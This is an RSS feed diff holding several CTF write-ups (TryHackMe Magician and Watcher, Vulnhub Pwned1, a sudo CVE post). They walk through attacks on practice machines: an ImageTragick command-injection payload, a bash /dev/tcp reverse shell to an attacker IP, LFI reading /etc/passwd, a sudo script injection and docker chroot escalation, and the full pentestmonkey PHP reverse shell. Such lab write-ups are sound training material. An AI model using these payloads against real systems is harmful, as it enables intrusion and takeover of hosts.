+&lt;p&gt;In This challange i want to use Sudo CVE and you can get it in &lt;a href=&quot;https://github.com/blasty/CVE-2021-3156&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_lunizzctf/bg_8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can get root easily .there is the little miss configuration in sudo(Lower version) but in the future it will be fixed by the maker. here I just tried poc from sudo and I do not recommend you to use this method.&lt;/p&gt;
+
+&lt;p&gt;Happy hacking :D .&lt;/p&gt;
+</description>
+        <pubDate>Mon, 01 Mar 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-tryhackme-CVE-SUDOERS/</link>
+        <guid isPermaLink="true">/writeup-tryhackme-CVE-SUDOERS/</guid>
+        
+        <category>medium-box</category>
+        
+        <category>lfi</category>
+        
+        <category>boot2root</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>web exploitation</category>
+        
+        <category>cve</category>
+        
+        
+        <category>Tryhackme</category>
+        
+        <category>Linux</category>
+        
+      </item>
+    
+      <item>
+        <title>Pwned1 Writeup</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;This is partical room from tryhackme entitled “Pwned1” form vulnhub. Difficulty of This box is Intermediate and in this box you will learn all about Fuzzing diretory, Custom exploitation, and getting privilage of root. Okay no let’s Pwn this box :p.&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;
+
+&lt;p&gt;As usual we will scan the ip of the box.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nmap -sV -sC 192.168.80.95  
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-28 00:29 WIB
+Nmap scan report for 192.168.80.95
+Host is up (0.26s latency).
+Not shown: 996 closed ports
+PORT    STATE    SERVICE        VERSION
+21/tcp  open     ftp            vsftpd 3.0.3
+22/tcp  open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
+|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
+|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
+80/tcp  open     http           Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Pwned....!!
+777/tcp filtered multiling-http
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                              
+Nmap done: 1 IP address (1 host up) scanned in 44.66 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As you can see the box have 3 port open and 1 port filtered. Let’s take a look at web apache.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_pwned1/bg.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing to see here but let’s take a look at robots.txt .&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Group 1
+
+User-agent: *
+Allow: /nothing
+Allow: /hidden_text
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There are have something interesting, i’m trying to fuzzing directory with gobuster in /hidden_text then i found secret.dic :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;secret.dic : 
+
+/hacked
+/vanakam_nanba
+/hackerman.gif 
+/facebook
+/whatsapp
+/instagram
+/pwned
+/pwned.com
+/pubg 
+/cod
+/fortnite
+/youtube
+/kali.org
+/hacked.vuln
+/users.vuln
+/passwd.vuln
+/pwned.vuln
+/backup.vuln
+/.ssh
+/root
+/home
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So i’m trying to fuzz again and i found page in /pwned.vuln.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_pwned1/bg_1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;in this case i’m don’t do injection like sql but just take a look the source code and we found user ftp!.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_pwned1/bg_2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now i’m going to login ftpuser with password we found before.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_pwned1/bg_3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-user&quot;&gt;Getting User&lt;/h2&gt;
+
+&lt;p&gt;As you can see we found folder secret which contains id_rsa and note.txt :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;id_rsa
+    &lt;pre&gt;&lt;code&gt;-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAthncqHSPVcE7xs136G/G7duiV6wULU+1Y906aF3ltGpht/sXByPB
+aEzxOfqRXlQfkk7hpSYk8FCAibxddTGkd5YpcSH7U145sc2n7jwv0swjMu1ml+B5Vra7JJ
+0cP/I27BcjMy7BxRpugZQJP214jiEixOK6gxTILZRAfHedblnd2rW6PhRcQK++jcEFM+ur
+gaaktNdFyK4deT+YHghsYAUi/zyWcvqSOGy9iwO62w4TvMfYRaIL7hzhtvR6Ze6aBypqhV
+m1C6YIIddYcJuXCV/DgiWXTIUQnhl38/Hxp0lzkhcN8muzOAmFMehktm3bX+y01jX+LziU
+GDYM7cTQitZ0MhPDMwIoR0L89mjP4lVyX4A0kn/MxQaj4IxQnY7QG4D4C1bMIYJ0IA//k9
+d4h0SNcEOlgDCZ0yCLZQeN3LSBe2IR4qFmdavyXJfb0Nzn5jhfVUchz9N9S8prP6+y3exZ
+ADnomqLN1eMcsmu8z5v7w0q7Iv3vS2XMc/c7deZDAAAFiH5GUFF+RlBRAAAAB3NzaC1yc2
+EAAAGBALYZ3Kh0j1XBO8bNd+hvxu3bolesFC1PtWPdOmhd5bRqYbf7FwcjwWhM8Tn6kV5U
+H5JO4aUmJPBQgIm8XXUxpHeWKXEh+1NeObHNp+48L9LMIzLtZpfgeVa2uySdHD/yNuwXIz
+MuwcUaboGUCT9teI4hIsTiuoMUyC2UQHx3nW5Z3dq1uj4UXECvvo3BBTPrq4GmpLTXRciu
+HXk/mB4IbGAFIv88lnL6kjhsvYsDutsOE7zH2EWiC+4c4bb0emXumgcqaoVZtQumCCHXWH
+Cblwlfw4Ill0yFEJ4Zd/Px8adJc5IXDfJrszgJhTHoZLZt21/stNY1/i84lBg2DO3E0IrW
+dDITwzMCKEdC/PZoz+JVcl+ANJJ/zMUGo+CMUJ2O0BuA+AtWzCGCdCAP/5PXeIdEjXBDpY
+AwmdMgi2UHjdy0gXtiEeKhZnWr8lyX29Dc5+Y4X1VHIc/TfUvKaz+vst3sWQA56JqizdXj
+HLJrvM+b+8NKuyL970tlzHP3O3XmQwAAAAMBAAEAAAGACQ18FLvGrGKw0A9C2MFFyGlUxr
+r9Pctqnw5OawXP94oaVYUb/fTfFopMq68zLtdLwoA9Y3Jj/7ZgzXgZxUu0e2VxpfgkgF58
+y8QHhyZi0j3nug5nPUGhhpgK8aUF1H/8DvyPeWnnpB7OQ47Sbt7IUXiAO/1xfDa6RNnL4u
+QnZWb+SnMiURe+BlE2TeG8mnoqyoU4Ru00wOc2++IXc9bDXHqk5L9kU071mex99701utIW
+VRoyPDP0F+BDsE6zDwIvfJZxY2nVAZkdxZ+lit5XCSUuNr6zZWBBu9yAwVBaeuqGeZtiFN
+W02Xd7eJt3dnFH+hdy5B9dD+jTmRsMkwjeE4vLLaSToVUVl8qWQy2vD6NdS3bdyTXWQWoU
+1da3c1FYajXHvQlra6yUjALVLVK8ex4xNlrG86zFRfsc1h2CjqjRqrkt0zJr+Sl3bGk+v6
+1DOp1QYfdD1r1IhFpxRlTt32DFcfzBs+tIfreoNSakDLSFBK/G0gQ7acfH4uM9XbBRAAAA
+wQC1LMyX0BKA/X0EWZZWjDtbNoS72sTlruffheQ9AiaT+fmbbAwwh2bMOuT5OOZXEH4bQi
+B7H5D6uAwhbVTtBLBrOc5xKOOKTcUabEpXJjif+WSK3T1Sd00hJUnNsesIM+GgdDhjXbfx
+WY9c2ADpYcD/1g+J5RRHBFr3qdxMPi0zeDZE9052VnJ+WdYzK/5O3TT+8Bi7xVCAZUuQ1K
+EcP3XLUrGVM6Usls4DEMJnd1blXAIcwQkAqGqwAHHuxgBIq64AAADBAN0/SEFZ9dGAn0tA
+Qsi44wFrozyYmr5OcOd6JtK9UFVqYCgpzfxwDnC+5il1jXgocsf8iFEgBLIvmmtc7dDZKK
+mCup9kY+fhR8wDaTgohGPWC6gO/obPD5DE7Omzrel56DaPwB7kdgxQH4aKy9rnjkgwlMa0
+hPAK+PN4NfLCDZbnPbhXRSYD+91b4PFPgfSXR06nVCKQ7KR0/2mtD7UR07n/sg2YsMeCzv
+m9kzzd64fbqGKEsRAUQJOCcgmKG2Zq3wAAAMEA0rRybJr61RaHlPJMTdjPanh/guzWhM/C
+b0HDZLGU9lSEFMMAI+NPWlv9ydQcth6PJRr/w+0t4IVSKClLRBhbUJnB8kCjMKu56RVMkm
+j6dQj+JUdPf4pvoUsfymhT98BhF9gUB2K+B/7srQ5NU2yNOV4e9uDmieH6jFY8hRo7RRCo
+N71H6gMon74vcdSYpg3EbqocEeUN4ZOq23Bc5R64TLu2mnOrHvOlcMzUq9ydAAufgHSsbY
+GxY4+eGHY4WJUdAAAADHJvb3RAQW5ubHlubgECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;note.txt :&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code&gt;Wow you are here 
+
+ariana won't happy about this note 
+
+sorry ariana :( 
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;user-ariana&quot;&gt;User ariana&lt;/h3&gt;
+
+&lt;p&gt;You can see we did it so easyly. Now lets login with user credential .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_pwned1/bg_4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then let’s take a look at permission of the user ariana &lt;code&gt;sudo -l&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ariana@pwned:/home$ sudo -l
+Matching Defaults entries for ariana on pwned:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User ariana may run the following commands on pwned:
+    (selena) NOPASSWD: /home/messenger.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is permission of ariana to execute bash of selena. Content of messenger.sh is :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash
+
+clear
+echo &quot;Welcome to linux.messenger &quot;
+                echo &quot;&quot;
+users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
+                echo &quot;&quot;
+echo &quot;$users&quot;
+                echo &quot;&quot;
+read -p &quot;Enter username to send message : &quot; name 
+                echo &quot;&quot;
+read -p &quot;Enter message for $name :&quot; msg
+                echo &quot;&quot;
+echo &quot;Sending message to $name &quot;
+
+$msg 2&amp;gt; /dev/null
+
+                echo &quot;&quot;
+echo &quot;Message sent to $name :) &quot;
+                echo &quot;&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;user-selena&quot;&gt;User Selena&lt;/h3&gt;
+
+&lt;p&gt;Now we can getting user selena with put &lt;code&gt;bash -i&lt;/code&gt; in messenger to &lt;code&gt;selena&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_pwned1/bg_5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilage-escalation&quot;&gt;Privilage Escalation&lt;/h2&gt;
+
+&lt;p&gt;As you can see selena have permission with docker, then we can escaping from docker and getting a root with this command &lt;code&gt;docker run -v /:/mnt --rm -it alpine chroot /mnt bash&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_pwned1/bg_6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we are root&lt;/p&gt;
+
+&lt;p&gt;So thats it my writeup i hope you enjoy , Happy hacking :D&lt;/p&gt;
+</description>
+        <pubDate>Sun, 28 Feb 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-vulnhub-pwned1/</link>
+        <guid isPermaLink="true">/writeup-vulnhub-pwned1/</guid>
+        
+        <category>boot2root</category>
+        
+        <category>medium-box</category>
+        
+        <category>custom exploitation</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>cve</category>
+        
+        
+        <category>Vulnhub</category>
+        
+        <category>Linux</category>
+        
+      </item>
+    
+      <item>
+        <title>Tryhackme Magician</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;This is partical room from tryhackme entitled “Magician” with Easy difficulty. In this room we will learn about Exploitation RCE with multiple vulnerabilities in ImageMagick from CVE-2016–3714 and Tunneling port. We will doing to getting shell from web then tunneling listening port to getting another web which contain root flag. Link room &lt;a href=&quot;https://tryhackme.com/room/magician&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ nmap -sC -sV -oA nmap/nmap 10.10.74.239
+Nmap scan report for 10.10.74.239
+Host is up (0.37s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+8081/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: magician
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Feb 23 17:27:16 2021 -- 1 IP address (1 host up) scanned in 37.43 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We just have 2 port open like FTP and Webservice (nginx). now i want to try login ftp with anonymous login.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see we can’t let in but there is have some hint for us. I’m going to https://imagetragick.com which is POC of CVE-2016–3714. Now before going to web we must put host in /etc/hosts.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;127.0.0.1       localhost
+127.0.1.1       Razor
+
+# CTF
+10.10.74.239 magician
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I’m trying to using burpsuite and test POC from imagetragick which we found before.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;
+
+&lt;p&gt;then i’m try to following POC from imagetragick and checking with ping back to my ip using tcpdump &lt;code&gt;$ sudo tcpdump -i tun0 host magician and -n icmp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oos.jpg&quot;;ping -c5 10.2.47.251&quot;)'
+pop graphic-context
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-shell&quot;&gt;Getting Shell&lt;/h3&gt;
+
+&lt;p&gt;And its works. i got ping back from web, So we can create revershell with &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTACKER-IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt; then prepare for revershell with nc &lt;code&gt;nc -lvnp &amp;lt;PORT&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now i got shell, then let’s make it shell to real shell .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;flag-usertxt&quot;&gt;Flag User.txt&lt;/h2&gt;
+
+&lt;p&gt;As you can see we got user magician and let’s take the flag :D&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;magician@magician:~$ cd /home/magician/
+magician@magician:~$ cat user.txt 
+THM{s----REDACTED----x}
+magician@magician:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There is have some files namely &lt;code&gt;the_magic_continues&lt;/code&gt; , let’s take a look the file :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is give me some hint again then let’s take a look port on This machines &lt;code&gt;(netstat -punta || ss --ntpu) | grep &quot;127&quot;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There are many methods we can use to tunnel the port. In this case I will use chisel and you can download that in &lt;a href=&quot;https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz&quot;&gt;here&lt;/a&gt;, Then uploaded to machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can setup the Chisel :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;First create server reverse port to tunneling port &lt;code&gt;./chisel server --reverse --port 4242&lt;/code&gt;.
+&lt;img src=&quot;/assets/thm_magician/bg_10.png&quot; alt=&quot;img&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Then create client on machines and setting R port to 6969 for access in web “localhost:6969” &lt;code&gt;./chisel client 10.2.47.251:4242 R:6969:localhost:6666&lt;/code&gt;.
+&lt;img src=&quot;/assets/thm_magician/bg_11.png&quot; alt=&quot;img&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Now we done for setup tunneling localhost:6666 to localhost:6969(In My Machine). Now let’s take a look the browser&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then just type &lt;code&gt;/root/root.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_13.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;flag-roottxt&quot;&gt;Flag Root.txt&lt;/h2&gt;
+
+&lt;p&gt;There is a Binary and we can convert to ASCII&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_magician/bg_14.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we have flag for root not :D&lt;/p&gt;
+
+&lt;p&gt;so that’s all the writeup that I made, now we have user flag and root flag.&lt;/p&gt;
+
+&lt;p&gt;Happy hacking :D&lt;/p&gt;
+</description>
+        <pubDate>Tue, 23 Feb 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-tryhackme-magician/</link>
+        <guid isPermaLink="true">/writeup-tryhackme-magician/</guid>
+        
+        <category>boot2root</category>
+        
+        <category>easy-box</category>
+        
+        <category>web exploitation</category>
+        
+        <category>enumeration</category>
+        
+        <category>cve</category>
+        
+        
+        <category>Tryhackme</category>
+        
+        <category>Linux</category>
+        
+      </item>
+    
+      <item>
+        <title>Tryhackme Watcher</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;This is partical room from tryhackme entitled “Watcher” with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python library injection. In this room we will doing lfi and getting any credential then exploit the box. Link room &lt;a href=&quot;https://tryhackme.com/room/watcher&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;First time we have to do is scanning the Machine :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap 10.10.35.205 -sC -sV
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 23:42 WIB
+Nmap scan report for 10.10.35.205
+Host is up (0.34s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
+|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
+|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Jekyll v4.1.1
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Corkplacemats
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.71 seconds
+
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From the results of nmap we know there are 3 open ports including ftp, ssh, and webserver. Now let’s take a look the webserver :
+&lt;img src=&quot;/assets/thm_watcher/bg_1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-user&quot;&gt;Getting User&lt;/h2&gt;
+
+&lt;p&gt;First i’m going to robots.txt, and i found this :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now lets looking at flag_1.txt.&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-1&quot;&gt;Flag 1&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we got first flag. now lets see the content of the webserver.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see there is maybe php runs a script which displays a file. and i trying File Inclusion then change striped.php to &lt;code&gt;/etc/passwd&lt;/code&gt;. From &lt;code&gt;http://10.10.35.205/post.php?post=striped.php&lt;/code&gt; to &lt;code&gt;http://10.10.35.205/post.php?post=/etc/passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then its works!!. Now lets see the secret file &lt;code&gt;/secret_file_do_not_read.txt&lt;/code&gt; in &lt;code&gt;http://10.10.35.205/post.php?post=/secret_file_do_not_read.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And We found credentials of the ftp!, let’s check the ftp user .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;flag-2&quot;&gt;Flag 2&lt;/h3&gt;
+
+&lt;p&gt;As you can see we found flag_2.txt and get it.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ cat flag_2.txt              
+FLAG{f------------e}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now as you can see in ftp there is have files which is can be uploaded. then i want try to upload php-revershell.php from pentest monkey which contain :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;&amp;lt;?php
+
+set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '10.2.47.251';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit(&quot;ERROR: Can't fork&quot;);
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+
+        // Make the current process a session leader
+        // Will only succeed if we forked
+        if (posix_setsid() == -1) {
+                printit(&quot;Error: Can't setsid()&quot;);
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+}
+
+// Change to a safe directory
+chdir(&quot;/&quot;);
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit(&quot;$errstr ($errno)&quot;);
+        exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 =&amp;gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
+   1 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
+   2 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit(&quot;ERROR: Can't spawn shell&quot;);
+        exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+
+while (1) {
+        // Check for end of TCP connection
+        if (feof($sock)) {
+                printit(&quot;ERROR: Shell connection terminated&quot;);
+                break;
+        }
+
+        // Check for end of STDOUT
+        if (feof($pipes[1])) {
+                printit(&quot;ERROR: Shell process terminated&quot;);
+                break;
+        }
+
+        // Wait until a command is end down $sock, or some
+        // command output is available on STDOUT or STDERR
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        // If we can read from the TCP socket, send
+        // data to process's STDIN
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit(&quot;SOCK READ&quot;);
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit(&quot;SOCK: $input&quot;);
+                fwrite($pipes[0], $input);
+        }
+
+        // If we can read from the process's STDOUT
+        // send data down tcp connection
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit(&quot;STDOUT READ&quot;);
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit(&quot;STDOUT: $input&quot;);
+                fwrite($sock, $input);
+        }
+
+        // If we can read from the process's STDERR
+        // send data down tcp connection
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit(&quot;STDERR READ&quot;);
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit(&quot;STDERR: $input&quot;);
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+        if (!$daemon) {
+                print &quot;$string\n&quot;;
+        }
+}
+
+?&amp;gt; 
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let’s Upload :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_watcher/bg_8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
